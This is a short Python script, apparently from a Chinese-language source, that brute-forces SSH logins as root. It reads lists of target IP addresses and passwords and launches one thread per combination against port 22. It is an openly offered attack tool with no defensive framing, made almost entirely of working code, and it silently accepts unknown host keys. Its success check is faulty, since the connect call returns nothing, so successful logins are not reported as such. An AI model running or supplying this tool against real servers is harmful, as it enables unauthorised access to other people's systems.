#UTF-8
#python3.6

import paramiko
import threading
import optparse


#-h查看帮助，-i选择ip字典，-p选择密码字典
#范例如下
#python ssh爆破多线程.py -i "dict/ip.txt" -p "dict/password.txt"


port = 22
username = "root"
ipdic=[]
passdic=[]

def ssh_conn(ip,password):
    try:
        print(ip + "   " + password)
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # 目的是接受不在本地Known_host文件下的主机。
        link = ssh.connect(ip, port, username, password)
        if (link):
            print("[+]success" + ip + " : " + password)
    except:
        print("[-]password error" + ip + " ; " + password)

def main():
    parser = optparse.OptionParser()
    parser.add_option('-i', dest='ipname', type='string', help="IP Address Dictionary")
    parser.add_option('-p', dest='passname', type='string', help="Password Dictionary")
    (options, args) = parser.parse_args()
    if(options.ipname==None)|(options.passname==None):
        print('---wrong input!---'+'\n')
        exit(0)
    else:
        ipname = options.ipname
        passname = options.passname

    ipFile = open(ipname)
    passFile = open(passname)
    for ipaddr in ipFile.readlines():
        ipdic.append(ipaddr.strip('\n'))
    for line in passFile.readlines():
        passdic.append(line.strip('\n'))

    for ip in ipdic:
        for password in passdic:
            ssh_th = threading.Thread(target=ssh_conn, args=(ip, password))
            ssh_th.start()


if __name__ =='__main__':
    main()

